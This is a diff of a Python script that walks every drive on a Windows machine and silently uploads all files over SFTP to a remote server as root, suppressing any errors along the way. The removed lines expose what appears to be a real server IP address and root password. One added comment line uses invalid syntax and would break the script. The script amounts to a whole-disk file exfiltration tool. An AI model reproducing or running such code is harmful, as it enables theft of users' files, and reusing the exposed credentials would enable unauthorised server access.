@@ -3,8 +3,8 @@ import paramiko
 import string
 import time
 
-transport = paramiko.Transport(('139.199.165.105', 22))
-transport.connect(username='root', password='hujunqiang520')
+transport = paramiko.Transport(('0.0.0.0', 22))
+transport.connect(username='root', password='xxx')
 
 sftp = paramiko.SFTPClient.from_transport(transport)  # 如果连接需要密钥，则要加上一个参数，hostkey="密钥"
 
@@ -23,6 +23,7 @@ def file_name(file_dir):
                 filepath = root+'\\'+file
                 print(filepath)
                 try:
+                    #防止发生错误，导致无法上传到服务器中
                     sftp.put(filepath, '/root/'+now_time+'/'+file)  # 将本地的Windows.txt文件上传至服务器/root/Windows.txt
                 except:
                     pass
@@ -34,6 +35,7 @@ def get_disklist():
             disk_list.append(disk)
     return disk_list
 
+\\扫描全盘
 for disk in get_disklist():
     file_name(disk+'\\')
 
